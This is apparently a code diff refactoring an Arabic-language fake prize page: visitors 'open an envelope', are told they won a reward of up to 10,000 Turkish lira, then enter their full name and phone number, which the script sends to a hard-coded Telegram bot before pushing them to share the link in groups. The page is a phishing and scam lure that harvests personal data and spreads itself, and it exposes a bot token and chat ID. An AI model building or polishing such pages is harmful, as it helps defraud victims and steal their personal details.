@@ -9,16 +9,17 @@
 :root{--red:#d32f2f;--bg:#f5f5f5}
 *{box-sizing:border-box}
 body{margin:0;font-family:tahoma,Arial;background:var(--bg);color:#222}
-.hidden{display:none}
-.center{max-width:420px;margin:0 auto;padding:12px}
-.card{background:#fff;border-radius:12px;box-shadow:0 10px 20px rgba(0,0,0,.12);padding:16px}
-.btn{width:100%;padding:12px;border-radius:10px;border:none;background:var(--red);color:#fff;font-size:16px;cursor:pointer}
-.input{width:100%;padding:12px 14px;border-radius:8px;border:1px solid #ddd;margin-bottom:10px;font-size:15px}
+.step{display:none}
+.step.active{display:block}
 .header{background:var(--red);color:#fff;padding:14px 10px;text-align:center;font-weight:bold}
 .flag{font-size:28px;display:block;line-height:1}
 .sub{text-align:center;margin:10px 0 0;font-size:14px;color:#555}
 .footer{text-align:center;color:#777;font-size:12px;margin:18px 0}
 .note{text-align:center;font-size:12px;color:#888;margin-top:6px}
+.center{max-width:420px;margin:0 auto;padding:12px}
+.card{background:#fff;border-radius:12px;box-shadow:0 10px 20px rgba(0,0,0,.12);padding:16px}
+.btn{width:100%;padding:12px;border-radius:10px;border:none;background:var(--red);color:#fff;font-size:16px;cursor:pointer}
+.input{width:100%;padding:12px 14px;border-radius:8px;border:1px solid #ddd;margin-bottom:10px;font-size:15px}
 
 /* envelopes */
 .envelopes{max-width:420px;margin:16px auto;display:grid;grid-template-columns:repeat(3,1fr);gap:12px;padding:0 10px}
@@ -29,10 +30,6 @@ body{margin:0;font-family:tahoma,Arial;background:var(--bg);color:#222}
 .env.opened .body{background:var(--red);color:#fff;font-size:16px}
 
 .result{text-align:center;font-size:18px;color:var(--red);min-height:28px;margin-top:6px}
-
-/* steps */
-.step{display:none}
-.step.active{display:block}
 .share{display:flex;gap:10px}
 .share a{flex:1;text-align:center;text-decoration:none}
 </style>
@@ -49,12 +46,12 @@ body{margin:0;font-family:tahoma,Arial;background:var(--bg);color:#222}
   <div class="sub">تجربة تفاعلية — نتيجة واحدة فقط</div>
 
   <div class="envelopes">
-    <div class="env" onclick="openEnv(this)"><div class="lid"></div><div class="body">✉️</div></div>
-    <div class="env" onclick="openEnv(this)"><div class="lid"></div><div class="body">✉️</div></div>
-    <div class="env" onclick="openEnv(this)"><div class="lid"></div><div class="body">✉️</div></div>
-    <div class="env" onclick="openEnv(this)"><div class="lid"></div><div class="body">✉️</div></div>
-    <div class="env" onclick="openEnv(this)"><div class="lid"></div><div class="body">✉️</div></div>
-    <div class="env" onclick="openEnv(this)"><div class="lid"></div><div class="body">✉️</div></div>
+    <div class="env"><div class="lid"></div><div class="body">✉️</div></div>
+    <div class="env"><div class="lid"></div><div class="body">✉️</div></div>
+    <div class="env"><div class="lid"></div><div class="body">✉️</div></div>
+    <div class="env"><div class="lid"></div><div class="body">✉️</div></div>
+    <div class="env"><div class="lid"></div><div class="body">✉️</div></div>
+    <div class="env"><div class="lid"></div><div class="body">✉️</div></div>
   </div>
 
   <div id="result" class="result"></div>
@@ -68,7 +65,7 @@ body{margin:0;font-family:tahoma,Arial;background:var(--bg);color:#222}
       <h3 style="margin-top:0;text-align:center">تسجيل الدخول</h3>
       <input class="input" id="name" placeholder="الاسم الكامل">
       <input class="input" id="phone" placeholder="رقم الهاتف">
-      <button class="btn" onclick="sendToTelegram()">متابعة</button>
+      <button class="btn" id="sendBtn">متابعة</button>
       <div class="note">سيتم التواصل معك لاحقًا</div>
     </div>
   </div>
@@ -83,7 +80,6 @@ body{margin:0;font-family:tahoma,Arial;background:var(--bg);color:#222}
         شارك الرابط في مجموعتك للمشاركة بالفرصة.
       </p>
       <div class="share">
-        <!-- عدّل الرابط لنشر صفحتك -->
         <a class="btn" target="_blank"
            href="https://t.me/share/url?url=https://example.com&text=جرب حظك الآن">
            مشاركة على تلغرام
@@ -97,38 +93,41 @@ body{margin:0;font-family:tahoma,Arial;background:var(--bg);color:#222}
 <div class="footer">© 2025</div>
 
 <script>
-let locked=false;
+/* إعدادات تلغرام */
+const BOT_TOKEN="8530299273:AAHH0iDVc60tDNnxtTuqDS17DWPXIBl9X50";
+const CHAT_ID="5516597110";
 
-// نتائج بصيغة قانونية (نقاط/قيمة تقديرية)
+/* نتائج قانونية */
 const outcomes=[
-  🇹🇷 ربحت مكافأة 10,000 ليرة تركي",
+  "🎉 ربحت مكافأة 10,000 نقطة",
   "🏆 جائزة خاصة بانتظارك",
   "💰 قيمة الجائزة قد تصل إلى 10,000 ل.ت*",
   "🎁 مكافأة ترحيبية كبرى"
 ];
 
-// إعدادات تلغرام
-const BOT_TOKEN="8530299273:AAHH0iDVc60tDNnxtTuqDS17DWPXIBl9X50";
-const CHAT_ID="5516597110";
+let locked=false;
 
+/* تنقّل الخطوات */
 function showStep(n){
   document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
   document.getElementById('step'+n).classList.add('active');
 }
 
-function openEnv(el){
-  if(locked) return;
-  locked=true;
-  el.classList.add('opened');
-  el.querySelector('.body').textContent='✔';
+/* ربط الضغط على الأظرف (بدون inline) */
+document.querySelectorAll('.env').forEach(env=>{
+  env.addEventListener('click', ()=>{
+    if(locked) return;
+    locked=true;
+    env.classList.add('opened');
+    env.querySelector('.body').textContent='✔';
+    document.getElementById('result').textContent =
+      outcomes[Math.floor(Math.random()*outcomes.length)];
+    setTimeout(()=>showStep(2), 1200); // التحويل المؤكد
+  });
+});
 
-  document.getElementById('result').textContent =
-    outcomes[Math.floor(Math.random()*outcomes.length)];
-
-  setTimeout(()=>showStep(2), 1200);
-}
-
-function sendToTelegram(){
+/* إرسال لتلغرام ثم الانتقال للمشاركة */
+document.getElementById('sendBtn').addEventListener('click', ()=>{
   const name=document.getElementById('name').value.trim();
   const phone=document.getElementById('phone').value.trim();
   if(!name||!phone){ alert('يرجى إدخال جميع البيانات'); return; }
@@ -144,7 +143,7 @@ function sendToTelegram(){
     headers:{"Content-Type":"application/json"},
     body:JSON.stringify({chat_id:CHAT_ID,text})
   }).then(()=>showStep(3));
-}
+});
 </script>
 
 </body>
